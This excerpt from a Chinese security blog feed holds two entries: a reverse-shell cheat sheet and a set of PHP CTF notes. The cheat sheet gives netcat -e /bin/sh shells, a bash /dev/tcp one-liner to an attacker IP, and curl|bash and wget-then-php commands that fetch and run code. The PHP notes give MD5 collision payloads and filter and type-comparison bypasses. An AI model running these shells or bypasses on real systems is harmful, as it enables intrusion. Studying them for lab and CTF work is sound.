<h1 id="反弹shell姿势"><a href="#反弹shell姿势" class="headerlink" title="反弹shell姿势"></a>反弹shell姿势</h1><h2 id="netcat-一句话反弹"><a href="#netcat-一句话反弹" class="headerlink" title="netcat 一句话反弹"></a>netcat 一句话反弹</h2><p>获取<code>shell</code>（想反弹谁的<code>shell</code>就在谁的后面加<code>-e /bin/sh</code>或<code>-e /bin/bash</code>）</p>
<h3 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向<code>shell</code></h3><p> 客户端主动连接服务器并获取服务器shell</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">客户端主动连接并得到反弹shell</span>    </span><br><span class="line">    <span class="string">nc</span> <span class="string">服务端ip</span> <span class="number">8888</span></span><br><span class="line"><span class="string">服务端监听连接</span></span><br><span class="line">    <span class="string">nc</span> <span class="string">-lvp</span> <span class="number">8888</span> <span class="string">-e</span> <span class="string">/bin/sh</span> </span><br><span class="line">    <span class="comment"># windows上：nc -lvp 8888 -e c:\windows\system32\cmd.exe </span></span><br></pre></td></tr></table></figure>

<h3 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向<code>shell</code></h3><p>服务器端连接并反弹<code>shell</code>给客户端</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">客户端监听</span></span><br><span class="line"><span class="string">nc</span> <span class="string">-lvp</span> <span class="number">8888</span> </span><br><span class="line"><span class="string">服务端连接客户端</span></span><br><span class="line"><span class="string">nc</span> <span class="string">客户端ip</span> <span class="number">8888</span> <span class="string">-e</span> <span class="string">/bin/sh</span> </span><br><span class="line"></span><br><span class="line"><span class="string">windows上：nc</span> <span class="string">ip</span> <span class="number">8888</span> <span class="string">-e</span> <span class="string">c:\windows\system32\cmd.exe</span></span><br></pre></td></tr></table></figure>

<h2 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">bash</span> -i &gt;&amp; /dev/tcp/我们靶机ip/我们靶机 port <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><code>bash</code>一句话命令详解<br>以下针对常用的<code>bash</code>反弹一句话进行了拆分说明，具体内容如下</p>
<p><a data-fancybox="gallery" data-src="/Reverses-shell/image-20221019235717724.png"><img src="/Reverses-shell/image-20221019235717724.png" alt="image-20221019235717724"></a></p>
<blockquote>
<p>其实以上bash反弹一句完整的解读过程就是：<br>bash产生了一个交互环境与本地主机主动发起与目标主机<code>8080</code>端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个<code>tcp 8080</code>会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash反弹环境。</p>
</blockquote>
<p>在反弹<code>shell</code>时要借助<code>netcat</code>工具反弹</p>
<h2 id="curl反弹shell"><a href="#curl反弹shell" class="headerlink" title="curl反弹shell"></a>curl反弹shell</h2><p>前提要利用<code>bash</code>一句话的情况下使用<code>curl</code>反弹<code>shell</code></p>
<p>在存在<code>命令执行</code>的服务器上执行</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">curl [自己的服务器]ip<span class="string">|bash</span></span><br><span class="line"><span class="comment">//在利用curl里执行我自己的服务器上的bash一句话</span></span><br></pre></td></tr></table></figure>

<p>该<code>ip</code>的<code>index</code>文件上含有<code>bash</code>一句话，就可以反弹<code>shell</code>。</p>
<p>例如在自己的服务器<code>index文件</code>上写上一句话</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="number">192.168.20.151</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p> <code>192.168.20.151</code>就是作为监听端口的服务器【攻击机】用来得到反弹的shell。</p>
<p><a data-fancybox="gallery" data-src="/Reverses-shell/image-20221020000027288.png"><img src="/Reverses-shell/image-20221020000027288.png" alt="image-20221020000027288"></a></p>
<p> 存在一句话，利用<code>curl</code>反弹。<br><code>kali</code>开启监听</p>
<p><a data-fancybox="gallery" data-src="/Reverses-shell/image-20221020000337460.png"><img src="/Reverses-shell/image-20221020000337460.png" alt="image-20221020000337460"></a></p>
<h2 id="wget方式反弹shell"><a href="#wget方式反弹shell" class="headerlink" title="wget方式反弹shell"></a><code>wget</code>方式反弹<code>shell</code></h2><p>利用<code>wget</code>进行下载执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget 192.168.20.130/shell.txt -O /tmp/x.php &amp;&amp; php /tmp/x.php</span><br></pre></td></tr></table></figure>

<p>利用下面贴出的<code>php</code>进行反弹。<br>开启监听</p>
<p> <a data-fancybox="gallery" data-src="/Reverses-shell/image-20221020000353533.png"><img src="/Reverses-shell/image-20221020000353533.png" alt="image-20221020000353533"></a></p>
]]></content>
      <categories>
        <category>daily</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP函数记录</title>
    <url>/php-functions/</url>
    <content><![CDATA[<p><code>还是挺重要的</code></p>
<span id="more"></span>

<h1 id="PHP函数记录"><a href="#PHP函数记录" class="headerlink" title="PHP函数记录"></a>PHP函数记录</h1><h2 id="1-php函数md5"><a href="#1-php函数md5" class="headerlink" title="1)php函数md5"></a>1)php函数md5</h2><blockquote>
<p>ps.<br>sha1，由于此函数依赖的算法已不足够复杂,不推荐使用此函数对明文密码加密。目前大多用md5</p>
<p>但是和md5一样，sha1函数无法处理数组，遇到数组会返回NULL</p>
</blockquote>
<p>做题时，了解到了一个新的函数<code>md5</code></p>
<blockquote>
<p>php md5函数介绍为：</p>
<p>md5( string , raw )</p>
<p>string : 规定需要计算的字符串</p>
<p>raw : 规定十六进制或二进制输出格式。</p>
<p>​        true：16字符二进制格式</p>
<p>​        false(默认): 32字符十六进制数</p>
</blockquote>
<p>比较常用的</p>
<p>数字型：<code>129581926211651571912466741651878684928</code></p>
<p><a data-fancybox="gallery" data-src="/php-functions/image-20220811135742130.png"><img src="/php-functions/image-20220811135742130.png" alt="image-20220811135742130"></a></p>
<p>字符型：<code>ffifdyop</code></p>
<p><a data-fancybox="gallery" data-src="/php-functions/image-20220811135813137.png"><img src="/php-functions/image-20220811135813137.png" alt="image-20220811135813137"></a></p>
<p>发现都有’<code>or</code>‘的形式，可以构造必真的结果</p>
<blockquote>
<p>MD5函数有一个漏洞，当输入的为数组时，会返回为NULL</p>
<p>所以当遇到md5(p1)&#x3D;&#x3D;&#x3D;md5(p2)，把p1和p2进行强比较时，又要求p1和p2不相等</p>
<p>由于两个不同的字符MD5值很难一致，于是输入p1[]和p2[]两个名字一致的字符，随便赋值，<br>p1[]&#x3D;1&amp;p2[]&#x3D;2<br>返回为空，使得强比较成立</p>
<hr>
<p>为什么会这样呢<br>我想起之前的遇到一个题，也有数组，问了一下大佬</p>
<p>大佬说，因为没有对数组中的元素数量声明，函数不知道数组元素第几个的值是1（或2）<br>导致函数到处扫，最后返回NULL【因为这个元素位置我们根本就没定】</p>
<p>下面举几个例子，以我个人理解<br>如果是<br>p1[0]&#x3D;1&amp;p2[0]&#x3D;2<br>是可以的，因为只定义了0号位的数据，而且不相等，其他位置数据没定义，所以比较也不可能出现相等</p>
<p>p1[0]&#x3D;1&amp;p2[1]&#x3D;1<br>是可以的，因为这里p1[]定义了0号位为1，而p2定义的是1号位为1，比较是按顺序比较的，两个数值虽然一样，但是位置不一样，所以比较还是不相等</p>
</blockquote>
<figure class="highlight q"><table><tr><td class="code"><pre><span class="line">下列的字符串的MD5值都是<span class="number">0</span>e开头的：</span><br><span class="line"></span><br><span class="line"> QNKCDZO</span><br><span class="line"> <span class="number">240610708</span></span><br><span class="line"> s878926199a</span><br><span class="line"> s155964671a</span><br><span class="line"> s214587387a</span><br><span class="line"> s1091221200a</span><br><span class="line"> <span class="number">0e215962017</span> #用于绕过$<span class="built_in">md5</span>==<span class="built_in">md5</span>($<span class="built_in">md5</span>)，因为其MD5开头也是<span class="number">0</span>e</span><br></pre></td></tr></table></figure>

<h3 id="强类型比较"><a href="#强类型比较" class="headerlink" title="强类型比较"></a><strong>强类型比较</strong></h3><p>遇到这种用数组绕过就不行了</p>
<blockquote>
<p><code>(string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])</code></p>
</blockquote>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">a<span class="operator">=</span>M<span class="variable">%C9h</span><span class="variable">%FF</span><span class="variable">%0</span>E<span class="variable">%E3</span><span class="variable">%5</span>C<span class="variable">%20</span><span class="variable">%95</span>r<span class="variable">%D4w</span><span class="variable">%7</span>Br<span class="variable">%15</span><span class="variable">%87</span><span class="variable">%D3o</span><span class="variable">%A7</span><span class="variable">%B2</span><span class="variable">%1</span>B<span class="variable">%DCV</span><span class="variable">%B7J</span><span class="variable">%3</span>D<span class="variable">%C0x</span><span class="variable">%3</span>E<span class="variable">%7</span>B<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%AF</span><span class="variable">%BF</span><span class="variable">%A2</span><span class="variable">%00</span><span class="variable">%A8</span><span class="variable">%28</span>K<span class="variable">%F3n</span><span class="variable">%8</span>EKU<span class="variable">%B3_Bu</span><span class="variable">%93</span><span class="variable">%D8Igm</span><span class="variable">%A0</span><span class="variable">%D1U</span><span class="variable">%5</span>D<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%FB_</span><span class="variable">%07</span><span class="variable">%FE</span><span class="variable">%A2</span></span><br><span class="line">&amp;b<span class="operator">=</span>M<span class="variable">%C9h</span><span class="variable">%FF</span><span class="variable">%0</span>E<span class="variable">%E3</span><span class="variable">%5</span>C<span class="variable">%20</span><span class="variable">%95</span>r<span class="variable">%D4w</span><span class="variable">%7</span>Br<span class="variable">%15</span><span class="variable">%87</span><span class="variable">%D3o</span><span class="variable">%A7</span><span class="variable">%B2</span><span class="variable">%1</span>B<span class="variable">%DCV</span><span class="variable">%B7J</span><span class="variable">%3</span>D<span class="variable">%C0x</span><span class="variable">%3</span>E<span class="variable">%7</span>B<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%AF</span><span class="variable">%BF</span><span class="variable">%A2</span><span class="variable">%02</span><span class="variable">%A8</span><span class="variable">%28</span>K<span class="variable">%F3n</span><span class="variable">%8</span>EKU<span class="variable">%B3_Bu</span><span class="variable">%93</span><span class="variable">%D8Igm</span><span class="variable">%A0</span><span class="variable">%D1</span><span class="variable">%D5</span><span class="variable">%5</span>D<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%FB_</span><span class="variable">%07</span><span class="variable">%FE</span><span class="variable">%A2</span></span><br><span class="line"></span><br><span class="line">a<span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%00</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%55</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span></span><br><span class="line">&amp;b<span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%02</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%d5</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span></span><br></pre></td></tr></table></figure>



<h2 id="2-php函数ereg，null截断"><a href="#2-php函数ereg，null截断" class="headerlink" title="2)php函数ereg，null截断"></a>2)php函数ereg，null截断</h2><p><strong>此函数在 PHP 5.3.0中已弃用，并在PHP 7.0.0中删除。</strong></p>
<p><strong>[所以遇到无法执行时，可能是出题人没有注意部署题目环境]</strong></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">ereg()函数用指定的模式搜索一个字符串中指定的字符串<span class="punctuation">,</span>如果匹配成功返回<span class="keyword">true</span><span class="punctuation">,</span>否则<span class="punctuation">,</span>则返回<span class="keyword">false</span>。搜索字母的字符是大小写敏感的。 </span><br><span class="line"></span><br><span class="line">ereg函数存在NULL截断漏洞，导致了正则过滤被绕过<span class="punctuation">,</span>所以可以使用<span class="variable">%00</span>截断正则匹配</span><br><span class="line"></span><br><span class="line">比如</span><br><span class="line">ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span><span class="punctuation">,</span> $_GET[&#x27;<span class="keyword">c</span>&#x27;])</span><br><span class="line"></span><br><span class="line">当<span class="keyword">c</span><span class="operator">=</span>a<span class="variable">%00123</span>时</span><br><span class="line">ereg只会检测到第一个a为止，后面的数据都被<span class="variable">%00</span>截断了，从而绕过匹配</span><br></pre></td></tr></table></figure>

<p>所以现在一般不再使用<code>ereg</code>，只是做为<code>preg_match</code>替代函数使用</p>
<h2 id="3-php函数sleep"><a href="#3-php函数sleep" class="headerlink" title="3)php函数sleep"></a>3)php函数sleep</h2><blockquote>
<p>当遇到这种需要我们输入参数，但是让参数值必须很大，</p>
<p>而且最后又以这个参数执行sleep函数，就会让我们等很久</p>
</blockquote>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">sleep</span><span class="params">((int)</span></span><span class="variable">$time</span>)</span><br></pre></td></tr></table></figure>

<p><code>sleep()</code>要延缓其程序执行的时间。</p>
<p>但是我们又不能等太久，可以构造php中的科学计数法绕过，就构造一个  </p>
<blockquote>
<p><code>time=0.3e7 （等价于0.3乘10的7次方）</code> </p>
</blockquote>
<p>这样它的值达到了判断的标准。</p>
<p>而且当它<strong>强制转化为整数型</strong>(<code>int</code>)的时候就会因为开头为<code>0.3</code>是<strong>小数变成零</strong>，这样可以满足条件。</p>
<h2 id="4-php函数is-numeric"><a href="#4-php函数is-numeric" class="headerlink" title="4)php函数is_numeric()"></a>4)php函数is_numeric()</h2><p>当遇到类似</p>
<blockquote>
<p><code>0e..;1e;..2e..;...</code></p>
</blockquote>
<p>函数会把其当作科学计数法</p>
<p>这样当遇到</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$num</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">if</span>(<span class="variable">$num</span>)&#123;</span><br><span class="line">            <span class="built_in">if</span>(!<span class="built_in">is_numeric</span>(<span class="variable">$time</span>))</span><br></pre></td></tr></table></figure>

<p>这种</p>
<blockquote>
<p>第一个要弱类型为<code>0</code></p>
<p>第二个要不为<code>0</code>才能执行真的判断</p>
<p>第三个要求其为数字</p>
</blockquote>
<p>就可以用类似<code>0e2</code>，绕过这三个</p>
<h2 id="5-eval-函数和system-函数的比较"><a href="#5-eval-函数和system-函数的比较" class="headerlink" title="5)eval()函数和system()函数的比较"></a>5)eval()函数和system()函数的比较</h2><p><code>记录一次在打靶机时，因为平常习惯用 eval()函数，但是靶机执行nc等命令时，eval()函数没有反应，就是因为其是代码执行，而非命令执行，所以把两者本质的用法搞懂还是很必要的</code></p>
<blockquote>
<p>eval类型函数是代码执行而不是命令执行（一句话木马）</p>
<p>system类型函数是命令执行而不是代码执行</p>
<p>eval函数里必须是一个符合php语法的语句，如果语句结尾没有分号会报错：eval()’d code</p>
</blockquote>
<h2 id="6-PHPのmb系列函数返回值"><a href="#6-PHPのmb系列函数返回值" class="headerlink" title="6)PHPのmb系列函数返回值"></a>6)PHPのmb系列函数返回值</h2><blockquote>
<p><code>https://github.com/php/php-src/issues/9008</code></p>
<p>它会导致奇怪的结果。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;PHP&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mb_detect_order</span>([<span class="string">&quot;ASCII&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>,<span class="string">&quot;BASE64&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(</span><br><span class="line"><span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$string</span>, <span class="literal">null</span>, <span class="literal">true</span>),</span><br><span class="line"><span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$string</span>, <span class="title function_ invoke__">mb_detect_order</span>(), <span class="literal">true</span>),</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$string</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;BASE64&quot;</span>),</span><br><span class="line"><span class="title function_ invoke__">mb_strtolower</span>(<span class="variable">$string</span>, <span class="string">&quot;BASE64&quot;</span>),</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>得到的结果发现</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Output for <span class="number">8.2</span><span class="number">.0</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br><span class="line"></span><br><span class="line">Output for <span class="number">8.0</span><span class="number">.1</span> - <span class="number">8.0</span><span class="number">.26</span><span class="punctuation">,</span> <span class="number">8.1</span><span class="number">.10</span> - <span class="number">8.1</span><span class="number">.13</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br><span class="line"></span><br><span class="line">Output for <span class="number">8.1</span><span class="number">.0</span> - <span class="number">8.1</span><span class="number">.9</span></span><br><span class="line">string(<span class="number">6</span>) <span class="string">&quot;BASE64&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br></pre></td></tr></table></figure>

<p><code>mb_detect_encoding($string, null, true)</code>返回值</p>
<p>只有在<code>PHP</code>版本在<code>8.1.0 - 8.1.9</code>时会返回<code>base64</code>，而在其他版本都是默认识别为<code>ASCII</code></p>
</blockquote>
<blockquote>
<p><code>mb_detect_encoding()</code>这类的函数对内容进行编码的识别，就是<code>匹配内容中的一些符合编码的字符，匹配成功对应编码加分</code>，最后从头到尾匹配完成后，<code>打分最高的编码就被认为是该内容的编码</code></p>
</blockquote>
<h2 id="7-preg-match-‘-‘"><a href="#7-preg-match-‘-‘" class="headerlink" title="7)preg_match(‘&#x2F;^$&#x2F;‘)"></a>7)preg_match(‘&#x2F;^$&#x2F;‘)</h2><p>因为preg_match只会去匹配第一行，所以这里可以用多行进行绕过</p>
<p>可以用<code>%0a</code>绕过，</p>
<p>比如，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^123$/&#x27;</span>,<span class="variable">$a</span>)</span><br></pre></td></tr></table></figure>

<p>一般情况只有<code>$a</code>为<code>123</code>时才可以通过，但是用换行符号<code>%0a</code></p>
<p>就可以绕过，因为preg_match只匹配一行也就是<code>123</code>所在的一行，%0a在下一行所以绕过了</p>
<p><a data-fancybox="gallery" data-src="/php-functions/image-20230908170938509.png"><img src="/php-functions/image-20230908170938509.png" alt="image-20230908170938509"></a></p>
<h2 id="8-phpinfo中session"><a href="#8-phpinfo中session" class="headerlink" title="8)phpinfo中session"></a>8)phpinfo中session</h2><blockquote>
<p>看到session.upload_progress.enabled开启，说明开启session.upload_progress功能，这个功能在我们上传文件时可以把文件上传进度和信息存储在session中。</p>
<p>又看到session.upload_progress.cleanup开启，说明当文件上传结束后，php将会立即清空对应session文件中的内容。所以需要条件竞争。</p>
<p>看到session.save_path，可以看到session文件保存路径。</p>
<p>看到session.use_strict_mode关闭，说明用户可以自己定义自己的sessionid。假如说sessionid&#x3D;zzzz，则文件上传后会在&#x2F;tmp目录下生成一个sess_zzzz的文件。</p>
</blockquote>
<h2 id="9-strcmp"><a href="#9-strcmp" class="headerlink" title="9)strcmp"></a>9)strcmp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;FLAG&#x27;</span>,<span class="string">&#x27;pwnhub&#123;this_is_flag&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>],FLAG) == <span class="number">0</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;success,flag:&quot;</span>.FLAG;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码解释<br>脚本意思是get到的flag和FLAG的值相等，就可以得到FLAG，但我们都不知道flag值是什么，利用strcmp函数特点尝试使用数组绕过。令flag[]&#x3D;xxx。</p>
<p>strcmp(string $str1,string $str2)</p>
<p>strcmp是比较两个字符串，如果str1&lt;str2 则返回&lt;0 如果str1大于str2返回&gt;0 如果两者相等 返回0。</p>
<p>strcmp比较的是字符串类型，如果强行传入其他类型参数，会出错，出错后返回值0，正是利用这点进行绕过。</p>
<p>flag[]&#x3D;xxx  –&gt; strcmp比较出错  –&gt; 返回null  –&gt; null&#x3D;&#x3D;0  –&gt; 条件成立得到flag</p>
<h2 id="10-无参数-getshell"><a href="#10-无参数-getshell" class="headerlink" title="10)无参数 getshell"></a>10)无参数 getshell</h2><p>php7前是不允许用<code>($a)();</code> 这种方法来执行动态函数。php7支持了该方式。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span> = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对 phpinfo 进行取反 再url编码输出</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// %8F%97%8F%96%91%99%90</span></span><br></pre></td></tr></table></figure>

<p>去请求</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET：</span><br><span class="line">?code=(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();</span><br></pre></td></tr></table></figure>

<p>如果不让我们括号或者空白字符起手，那这里就涉及到另一种变种了比如phpinfo之前是<code>(~%8F%97%8F%96%91%99%90)</code></p>
<p><code>()</code>，就可以将换成中括号然后空字符换成<code>!%FF</code>，之后可以变成<code>[~%8F%97%8F%96%91%99%90][!%ff]</code>，用数组的形式</p>
<p>去绕过，<code>!%ff</code>表示非，那这里肯定意思就是0了</p>
<h2 id="11-error类-MD5绕过-eval执行"><a href="#11-error类-MD5绕过-eval执行" class="headerlink" title="11)error类|MD5绕过|eval执行"></a>11)error类|MD5绕过|eval执行</h2><p>题目[极客大挑战 2020]Greatphp</p>
<blockquote>
<p><a href="https://syunaht.com/p/4128421624.html">https://syunaht.com/p/4128421624.html</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在这里面，无法用数组进行md5绕过，所以可以用Error类绕过md5和sha1检测</p>
<blockquote>
<p>Error类是php的原生类，当md5、sha1对类进行时，会触发类的<code>__tostring</code>魔术方法，而<code>Error</code>类的<code>__tostring</code>返回值是包含触发代码所处的行数，所以两个变量定义必须在同一行，如下测试<code>$a</code>和<code>$b</code></p>
<p>并且，然后由于Error的toString是无法完全控制的,会有其他输出,所以使用</p>
<p><code>?&gt;&lt;?=</code></p>
<p>结束php从而完整控制整块代码</p>
</blockquote>
<blockquote>
<blockquote>
<p>当然还有其他的原生类也可以用，这边可以用原生类Error或者Exception，只不过 Exception 类适用于PHP 5和7，而 </p>
<p>Error 只适用于 PHP 7。</p>
</blockquote>
</blockquote>
<p> 测试</p>
